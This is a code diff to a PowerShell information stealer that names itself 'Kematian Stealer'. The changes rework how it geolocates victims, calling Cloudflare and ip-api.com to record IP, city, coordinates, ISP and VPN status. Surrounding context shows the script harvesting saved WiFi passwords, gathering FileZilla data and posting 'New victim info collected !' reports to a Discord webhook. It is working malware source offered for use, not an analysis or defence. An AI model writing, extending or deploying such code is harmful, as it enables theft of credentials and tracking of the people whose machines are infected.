@@ -242,8 +242,9 @@ function Backup-Data {
     $offsetHours = $timezone.BaseUtcOffset.Hours
     $timezoneString = "UTC$offsetHours"
     $filedate = Get-Date -Format "yyyy-MM-dd"
-    $countryCode = (Invoke-WebRequest -Uri "https://ipapi.co/country_code" -UseBasicParsing).Content
-    $folderformat = "$env:APPDATA\Kematian\$countryCode-($uuid)-($filedate)-($timezoneString)"
+    $cc = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
+    $countrycode = ($cc -split "`n" | ? {$_ -match '^loc=(.*)$'} | % { $Matches[1] })
+    $folderformat = "$env:APPDATA\Kematian\$countrycode-($uuid)-($filedate)-($timezoneString)"
 
     $folder_general = $folderformat
     $folder_messaging = "$folderformat\Messaging Sessions"
@@ -261,7 +262,25 @@ function Backup-Data {
     }
 
     #bulk data (added build ID with banner)
-    $ip = (Invoke-WebRequest -Uri "https://ipapi.co/ip").Content
+    function Get-Network {
+	$resp = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
+    $ip = [regex]::Match($resp, 'ip=([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)').Groups[1].Value
+    $url = "http://ip-api.com/json"
+	$hosting = (Invoke-WebRequest -Uri "http://ip-api.com/line/?fields=hosting" -useb).Content
+    $response = Invoke-RestMethod -Uri $url -Method Get
+    if (-not $response) {
+        return "Not Found"
+    }
+    $country = $response.country
+    $regionName = $response.regionName
+    $city = $response.city
+    $zip = $response.zip
+    $lat = $response.lat
+    $lon = $response.lon
+    $isp = $response.isp
+    return "IP: $ip `nCountry: $country `nRegion: $regionName `nCity: $city `nISP: $isp `nLatitude: $lat `nLongitude: $lon `nVPN/Proxy: $hosting"
+    }
+    $networkinfo = Get-Network
     $lang = (Get-WinUserLanguageList).LocalizedName
     $date = Get-Date -Format "r"
     $osversion = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
@@ -342,7 +361,6 @@ function Backup-Data {
             $usedpercent = [int](($usedspace / $SizeOfDisk) * 100)
             [PSCustomObject]@{
                 Drive             = $disk.Name
-                Name              = $disk.VolumeName
                 "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                 "Free Disk Size"  = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, $FreePercent
                 "Used Space"      = "{0:N0} GB ({1:N0} %)" -f $usedspace, $usedpercent
@@ -351,7 +369,7 @@ function Backup-Data {
         $results 
     }
     $alldiskinfo = diskdata -wrap -autosize | Format-List | Out-String
-    $info = "$kematian_info`n`n`nIP: $ip `nLanguage: $lang `nDate: $date `nTimezone: $timezoneString `nScreen Size: $screen `nUser Name: $username `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `n`n[Disk Info] $alldiskinfo `n[Hardware] `nCPU: $cpu `nCores: $corecount `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime `nAntiVirus: $avlist `n`n[Network] $network `n[Startup Applications] $startupapps `n[Processes] $runningapps `n[Services] $services `n[Software] $software"
+    $info = "$kematian_info`n`n`n$networkinfo `nLanguage: $lang `nDate: $date `nTimezone: $timezoneString `nScreen Size: $screen `nUser Name: $username `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `n`n[Disk Info] $alldiskinfo `n[Hardware] `nCPU: $cpu `nCores: $corecount `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime `nAntiVirus: $avlist `n`n[Network] $network `n[Startup Applications] $startupapps `n[Processes] $runningapps `n[Services] $services `n[Software] $software"
     $info | Out-File -FilePath "$folder_general\System.txt" -Encoding UTF8
 
     $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object {
@@ -1120,7 +1138,7 @@ FileZilla: $filezilla_info
         "content"     = "@everyone"
         "title"       = "Kematian Data Extractor"
         "description" = "Kematian"
-        "color"       = "3447003"
+        "color"       = "15105570"
         "avatar_url"  = "https://i.imgur.com/6w6qWCB.jpeg"
         "url"         = "https://discord.com/invite/WJCNUpxnrE"
         "embeds"      = @(
@@ -1128,7 +1146,7 @@ FileZilla: $filezilla_info
                 "title"       = "Kematian Stealer"
                 "url"         = "https://github.com/ChildrenOfYahweh/Kematian-Stealer"
                 "description" = "New victim info collected !"
-                "color"       = "3447003"
+                "color"       = "15105570"
                 "footer"      = @{
                     "text" = "Made by Kdot, Chainski and EvilByteCode"
                 }
@@ -1137,8 +1155,8 @@ FileZilla: $filezilla_info
                 }
                 "fields"      = @(
                     @{
-                        "name"  = ":satellite: IP"
-                        "value" = "``````$ip``````"
+                        "name"  = ":satellite: Network"
+                        "value" = "``````$networkinfo``````"
                     },
                     @{
                         "name"  = ":bust_in_silhouette: User Information"
